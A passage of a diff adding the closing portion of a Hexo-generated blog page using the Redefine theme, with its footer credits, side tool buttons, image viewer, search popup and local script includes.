+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
